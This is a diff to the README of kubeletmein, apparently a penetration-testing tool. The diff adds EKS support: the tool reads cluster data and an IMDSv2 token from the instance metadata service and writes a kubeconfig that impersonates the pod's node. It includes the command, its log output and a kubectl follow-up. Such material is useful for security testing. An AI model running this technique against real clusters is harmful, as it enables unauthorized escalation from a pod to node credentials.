@@ -18,7 +18,7 @@ GKE is fully supported and relies on the metadata concealmeant being disabled (t
 
 ### EKS
 
-I'm working on support for EKS. It's actually a lot easier to exploit this on EKS than GKE.
+EKS support added by @airman604 based on the AWS EKS [bootstrap script](https://github.com/awslabs/amazon-eks-ami/blob/master/files/bootstrap.sh). This is a one step process and doesn't create a fake node, but rather impersonates the node on which the pod is running.
 
 ### Digital Ocean
 
@@ -67,7 +67,27 @@ kubectl --kubeconfig kubeconfig get pods
 
 ### EKS
 
-Coming soon.....
+On EKS we can impersonate current node in a single step using IAM authentication.
+
+```
+~ $ kubeletmein eks
+2021-03-01T21:53:36Z [ℹ]  downloading aws-iam-authenticator and generating kubeconfig for current EKS node
+2021-03-01T21:53:36Z [ℹ]  fetching cluster information from user-data from the metadata service
+2021-03-01T21:53:36Z [ℹ]  getting IMDSv2 token
+2021-03-01T21:53:36Z [ℹ]  getting user-data
+2021-03-01T21:53:36Z [ℹ]  downloading aws-iam-authenticator...
+2021-03-01T21:53:36Z [ℹ]  fetching information about aws-iam-authenticator latest release
+2021-03-01T21:53:36Z [ℹ]  downloading aws-iam-authenticator from https://github.com/kubernetes-sigs/aws-iam-authenticator/releases/download/v0.5.2/aws-iam-authenticator_0.5.2_linux_amd64
+2021-03-01T21:53:37Z [ℹ]  generating EKS node kubeconfig file at: kubeconfig
+2021-03-01T21:53:37Z [ℹ]  wrote kubeconfig
+2021-03-01T21:53:37Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+```
+
+Now you can use the kubeconfig, as it suggests.
+
+```
+kubectl --kubeconfig kubeconfig get pods
+```
 
 ### Digital Ocean
 
